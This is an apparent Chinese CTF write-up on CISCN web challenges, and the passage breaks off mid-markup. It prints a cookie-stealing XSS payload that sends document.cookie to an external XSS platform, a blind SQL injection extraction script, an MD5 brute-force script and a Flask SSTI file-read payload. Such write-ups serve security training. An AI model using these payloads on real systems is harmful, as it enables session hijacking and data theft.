class=\"string\">\"(function()&#123;window.location.href='http://xss.buuoj.cn/index.php?do=api&amp;id=dzWPkK&amp;keepsession=0&amp;location='+escape((function()&#123;try&#123;return document.location.href&#125;catch(e)&#123;return''&#125;&#125;)())+'&amp;toplocation='+escape((function()&#123;try&#123;return top.location.href&#125;catch(e)&#123;return''&#125;&#125;)())+'&amp;cookie='+escape((function()&#123;try&#123;return document.cookie&#125;catch(e)&#123;return''&#125;&#125;)())+'&amp;opener='+escape((function()&#123;try&#123;return(window.opener&amp;&amp;window.opener.location.href)?window.opener.location.href:''&#125;catch(e)&#123;return''&#125;&#125;)());&#125;)();\"</span></span><br><span class=\"line\">output = <span class=\"string\">\"\"</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> c in in_str:</span><br><span class=\"line\">    output += <span class=\"string\">\"&amp;#\"</span> + str(ord(c))</span><br><span class=\"line\"><span class=\"keyword\">print</span>(<span class=\"string\">\"&lt;svg&gt;&lt;script&gt;eval&amp;#40&amp;#34\"</span> + output + <span class=\"string\">\"&amp;#34&amp;#41&lt;/script&gt;\"</span>)</span><br></pre></td></tr></table></figure>\n\n<p>得到地址后去commitbug.php（反馈）页面提交url</p>\n<p><img src=\"/pic/102.png\" alt=\"\"></p>\n<p>url中要将*.buuoj.cn改成web</p>\n<p>附上碰撞的脚本，发现使用python编写会出错（字符与MD5对应不上）</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span>($a=<span class=\"number\">0</span>;substr(md5($a),<span class=\"number\">0</span>,<span class=\"number\">6</span>)!=<span class=\"string\">'2ccf73'</span>;$a++)&#123;&#125;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> md5($a);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> urldecode(<span class=\"string\">'%09'</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $a;</span><br><span class=\"line\"> <span class=\"comment\">//2ccf731c402b81796327fb7a4c5cd943\t225315</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>去xss平台收cookie</p>\n<p><img src=\"/pic/103.png\" alt=\"\"></p>\n<p>修改cookie为收到的cookie，访问admin.php   存在sql注入</p>\n<p><img src=\"/pic/104.png\" alt=\"\">)<img src=\"/pic/105.png\" alt=\"\"></p>\n<p>编写注入脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># @Time    : 2/19/2020 12:34 AM</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">str2hex</span><span class=\"params\">(strs)</span>:</span></span><br><span class=\"line\">    hexs=<span class=\"string\">'0x'</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> range(len(strs)):</span><br><span class=\"line\">        hexs+=hex(ord(strs[x]))[<span class=\"number\">2</span>:]</span><br><span class=\"line\">    print(hexs)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> hexs</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get</span><span class=\"params\">(payload)</span>:</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://da74811e-0cb8-498a-a1c7-362929c21b2d.node3.buuoj.cn/admin.php?id=0^('</span>+payload+<span class=\"string\">')'</span></span><br><span class=\"line\">    <span class=\"comment\"># print(url)</span></span><br><span class=\"line\">    html = requests.get(url,cookies=&#123;<span class=\"string\">'PHPSESSID'</span>:<span class=\"string\">'e7f4c1e48fd638f2a517cbe6d0a81857'</span>&#125;)</span><br><span class=\"line\">    <span class=\"comment\"># print(html)</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> html</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">binsea</span><span class=\"params\">(s_payload,len=<span class=\"number\">999</span>)</span>:</span></span><br><span class=\"line\">    result = <span class=\"string\">''</span></span><br><span class=\"line\">    x=<span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> x &lt;= len :</span><br><span class=\"line\">        error = <span class=\"number\">0</span></span><br><span class=\"line\">        left = <span class=\"number\">0</span></span><br><span class=\"line\">        right = <span class=\"number\">126</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> left &lt;= right:</span><br><span class=\"line\">            mid = (left + right) / <span class=\"number\">2</span></span><br><span class=\"line\">            payload = <span class=\"string\">\"ascii(substr((%s),%d,1))&gt;%d\"</span> % (s_payload,x, mid)</span><br><span class=\"line\"></span><br><span class=\"line\">            res = get(payload)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> res.status_code == <span class=\"number\">404</span> <span class=\"keyword\">or</span> res.status_code == <span class=\"number\">429</span>:</span><br><span class=\"line\">                x=x<span class=\"number\">-1</span></span><br><span class=\"line\">                error = <span class=\"number\">1</span></span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">            html=res.text</span><br><span class=\"line\">            <span class=\"comment\"># print(html,'*-*-*-*-*-*', mid)</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">'不能查询管理员哦'</span>  <span class=\"keyword\">in</span> html:</span><br><span class=\"line\">                left = mid +<span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                right = mid <span class=\"number\">-1</span></span><br><span class=\"line\">        mid = int((left + right + <span class=\"number\">1</span>) / <span class=\"number\">2</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> mid == <span class=\"number\">0</span> :</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> error == <span class=\"number\">0</span> :</span><br><span class=\"line\">            result += chr(mid)</span><br><span class=\"line\">            print(result)</span><br><span class=\"line\">        x=x+<span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> result</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_database</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    s_payload=<span class=\"string\">'database()'</span></span><br><span class=\"line\">    database = binsea(s_payload)</span><br><span class=\"line\">    print(database)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_tables</span><span class=\"params\">(db)</span>:</span></span><br><span class=\"line\">    db=str2hex(db)</span><br><span class=\"line\">    s_payload = <span class=\"string\">'select(group_concat(table_name))from(information_schema.tables)where(table_schema='</span>+db+<span class=\"string\">')'</span></span><br><span class=\"line\">    tables=binsea(s_payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_columns</span><span class=\"params\">(table)</span>:</span></span><br><span class=\"line\">    table = str2hex(table)</span><br><span class=\"line\">    s_payload = <span class=\"string\">'select(group_concat(column_name))from(information_schema.columns)where(table_name='</span>+table+<span class=\"string\">')'</span></span><br><span class=\"line\">    columns=binsea(s_payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_data</span><span class=\"params\">(columns,table)</span>:</span></span><br><span class=\"line\">    s_payload=<span class=\"string\">'select(group_concat('</span>+columns+<span class=\"string\">'))from('</span>+table+<span class=\"string\">')'</span></span><br><span class=\"line\">    password=binsea(s_payload)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># get_database() #ciscn</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># get_tables('ciscn') #flag,users</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># get_columns('flag') #flagg</span></span><br><span class=\"line\"></span><br><span class=\"line\">get_data(<span class=\"string\">'flagg'</span>,<span class=\"string\">'flag'</span>) <span class=\"comment\">#flag&#123;88331b80-7fb8-4f2f-9fa1-a4b85bd8562d&#125;</span></span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"华东南赛区-Double-Secret\"><a href=\"#华东南赛区-Double-Secret\" class=\"headerlink\" title=\"华东南赛区 Double Secret\"></a>华东南赛区 Double Secret</h2><p>打卡题目的提示是:<code>Welcome To Find Secret</code></p>\n<p>使用御剑扫一下目录，扫描到robots.txt</p>\n<p>内容是: <code>It is Android ctf</code></p>\n<p>尝试范围/secret  提示<code>Tell me your secret.I will encrypt it so others can&#39;t see</code></p>\n<p>传入参数?secret=123456789后报错</p>\n<p><img src=\"/pic/106.png\" alt=\"\"></p>\n<p>发现是flask框架，点开/app/app.py后有如下代码</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">File <span class=\"string\">\"/app/app.py\"</span>, line <span class=\"number\">35</span>, <span class=\"keyword\">in</span> secret</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(secret==<span class=\"literal\">None</span>):</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">'Tell me your secret.I will encrypt it so others can\\'t see'</span></span><br><span class=\"line\"></span><br><span class=\"line\">    rc=rc4_Modified.RC4(<span class=\"string\">\"HereIsTreasure\"</span>)   <span class=\"comment\">#解密</span></span><br><span class=\"line\"></span><br><span class=\"line\">    deS=rc.do_crypt(secret)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    a=render_template_string(safe(deS))</span><br><span class=\"line\"></span><br><span class=\"line\"> [Open an interactive python shell <span class=\"keyword\">in</span> this frame]  </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"string\">'ciscn'</span> <span class=\"keyword\">in</span> a.lower():</span><br><span class=\"line\">python</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">'flag detected!'</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> a</span><br></pre></td></tr></table></figure>\n\n<p>是RC4加密，RC4算法加密又是解密将payload加密就好</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># @Time    : 2/25/2020 11:38 PM</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">RC4</span>:</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self, key)</span>:</span></span><br><span class=\"line\">        self.key = key</span><br><span class=\"line\">        self.key_length = len(key)</span><br><span class=\"line\">        self._init_S_box()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">_init_S_box</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">        self.Box = [i <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">256</span>)]</span><br><span class=\"line\">        k = [self.key[i % self.key_length] <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">256</span>)]</span><br><span class=\"line\">        j = <span class=\"number\">0</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">256</span>):</span><br><span class=\"line\">            j = (j + self.Box[i] + ord(k[i])) % <span class=\"number\">256</span></span><br><span class=\"line\">            self.Box[i], self.Box[j] = self.Box[j], self.Box[i]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">crypt</span><span class=\"params\">(self, plaintext)</span>:</span></span><br><span class=\"line\">        i = <span class=\"number\">0</span></span><br><span class=\"line\">        j = <span class=\"number\">0</span></span><br><span class=\"line\">        result = <span class=\"string\">''</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> ch <span class=\"keyword\">in</span> plaintext:</span><br><span class=\"line\">            i = (i + <span class=\"number\">1</span>) % <span class=\"number\">256</span></span><br><span class=\"line\">            j = (j + self.Box[i]) % <span class=\"number\">256</span></span><br><span class=\"line\">            self.Box[i], self.Box[j] = self.Box[j], self.Box[i]</span><br><span class=\"line\">            t = (self.Box[i] + self.Box[j]) % <span class=\"number\">256</span></span><br><span class=\"line\">            result += chr(self.Box[t] ^ ord(ch))</span><br><span class=\"line\">        <span class=\"keyword\">return</span> result</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">\"http://69f0dda2-d8d5-458e-97f9-342bff8d47a4.node3.buuoj.cn/secret?secret=\"</span></span><br><span class=\"line\">a = RC4(<span class=\"string\">'HereIsTreasure'</span>)</span><br><span class=\"line\">cmd = <span class=\"string\">\"&#123;&#123; [].__class__.__base__.__subclasses__()[40]('/flag.txt').read() &#125;&#125;\"</span></span><br><span class=\"line\">payload = urllib.parse.quote(a.crypt(cmd))</span><br><span class=\"line\">print(payload)</span><br><span class=\"line\">res = requests.get(url + payload)</span><br><span class=\"line\">print(res.text)</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"<h2 id=\"华北赛区-Day1-Web1-Dropbox\"><a href=\"#华北赛区-Day1-Web1-Dropbox\" class=\"headerlink\" title=\"华北赛区 Day1 Web1 Dropbox\"></a>华北赛区 Day1 Web1 Dropbox</h2><p>拿到题目是一个登入页面</p>\n<p>注册，登入，上传文件</p>\n<p>上传一个图片，上传成功。点击下载，下载时发现有任意文件下载漏洞</p>\n<p>把文件下载下来进行代码审计</p>","more":"<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;index.php</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">session_start();</span><br><span class=\"line\">if (!isset($_SESSION[&#39;login&#39;])) &#123;</span><br><span class=\"line\">    header(&quot;Location: login.php&quot;);</span><br><span class=\"line\">    die();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class=\"line\">&lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1, shrink-to-fit&#x3D;no&quot;&gt;</span><br><span class=\"line\">&lt;title&gt;网盘管理&lt;&#x2F;title&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">    &lt;link href&#x3D;&quot;static&#x2F;css&#x2F;bootstrap.min.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class=\"line\">    &lt;link href&#x3D;&quot;static&#x2F;css&#x2F;panel.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class=\"line\">    &lt;script src&#x3D;&quot;static&#x2F;js&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">    &lt;script src&#x3D;&quot;static&#x2F;js&#x2F;bootstrap.bundle.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">    &lt;script src&#x3D;&quot;static&#x2F;js&#x2F;toast.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">    &lt;script src&#x3D;&quot;static&#x2F;js&#x2F;panel.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;&#x2F;head&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">    &lt;nav aria-label&#x3D;&quot;breadcrumb&quot;&gt;</span><br><span class=\"line\">    &lt;ol class&#x3D;&quot;breadcrumb&quot;&gt;</span><br><span class=\"line\">        &lt;li class&#x3D;&quot;breadcrumb-item active&quot;&gt;管理面板&lt;&#x2F;li&gt;</span><br><span class=\"line\">        &lt;li class&#x3D;&quot;breadcrumb-item active&quot;&gt;&lt;label for&#x3D;&quot;fileInput&quot; class&#x3D;&quot;fileLabel&quot;&gt;上传文件&lt;&#x2F;label&gt;&lt;&#x2F;li&gt;</span><br><span class=\"line\">        &lt;li class&#x3D;&quot;active ml-auto&quot;&gt;&lt;a href&#x3D;&quot;#&quot;&gt;你好 &lt;?php echo $_SESSION[&#39;username&#39;]?&gt;&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class=\"line\">    &lt;&#x2F;ol&gt;</span><br><span class=\"line\">&lt;&#x2F;nav&gt;</span><br><span class=\"line\">&lt;input type&#x3D;&quot;file&quot; id&#x3D;&quot;fileInput&quot; class&#x3D;&quot;hidden&quot;&gt;</span><br><span class=\"line\">&lt;div class&#x3D;&quot;top&quot; id&#x3D;&quot;toast-container&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">include &quot;class.php&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">$a &#x3D; new FileList($_SESSION[&#39;sandbox&#39;]);</span><br><span class=\"line\">$a-&gt;Name();</span><br><span class=\"line\">$a-&gt;Size();</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;download.php</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">session_start();</span><br><span class=\"line\">if (!isset($_SESSION[&#39;login&#39;])) &#123;</span><br><span class=\"line\">    header(&quot;Location: login.php&quot;);</span><br><span class=\"line\">    die();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">if (!isset($_POST[&#39;filename&#39;])) &#123;</span><br><span class=\"line\">    die();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">include &quot;class.php&quot;;</span><br><span class=\"line\">ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:&#x2F;etc:&#x2F;tmp&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">chdir($_SESSION[&#39;sandbox&#39;]);</span><br><span class=\"line\">$file &#x3D; new File();</span><br><span class=\"line\">$filename &#x3D; (string) $_POST[&#39;filename&#39;];</span><br><span class=\"line\">if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, &quot;flag&quot;) &#x3D;&#x3D;&#x3D; false) &#123;   &#x2F;&#x2F;stristr 搜索字符串在另一字符串中的第一次出现不区分大小写</span><br><span class=\"line\">    Header(&quot;Content-type: application&#x2F;octet-stream&quot;);</span><br><span class=\"line\">    Header(&quot;Content-Disposition: attachment; filename&#x3D;&quot; . basename($filename));</span><br><span class=\"line\">    echo $file-&gt;close();</span><br><span class=\"line\">&#125; else &#123;</span><br><span class=\"line\">    echo &quot;File not exist&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;delete.php</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">session_start();</span><br><span class=\"line\">if (!isset($_SESSION[&#39;login&#39;])) &#123;</span><br><span class=\"line\">    header(&quot;Location: login.php&quot;);</span><br><span class=\"line\">    die();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">if (!isset($_POST[&#39;filename&#39;])) &#123;</span><br><span class=\"line\">    die();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">include &quot;class.php&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">chdir($_SESSION[&#39;sandbox&#39;]);</span><br><span class=\"line\">$file &#x3D; new File();</span><br><span class=\"line\">$filename &#x3D; (string) $_POST[&#39;filename&#39;];</span><br><span class=\"line\">if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename)) &#123;</span><br><span class=\"line\">    $file-&gt;detele();</span><br><span class=\"line\">    Header(&quot;Content-type: application&#x2F;json&quot;);</span><br><span class=\"line\">    $response &#x3D; array(&quot;success&quot; &#x3D;&gt; true, &quot;error&quot; &#x3D;&gt; &quot;&quot;);</span><br><span class=\"line\">    echo json_encode($response);</span><br><span class=\"line\">&#125; else &#123;</span><br><span class=\"line\">    Header(&quot;Content-type: application&#x2F;json&quot;);</span><br><span class=\"line\">    $response &#x3D; array(&quot;success&quot; &#x3D;&gt; false, &quot;error&quot; &#x3D;&gt; &quot;File not exist&quot;);</span><br><span class=\"line\">    echo json_encode($response);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span 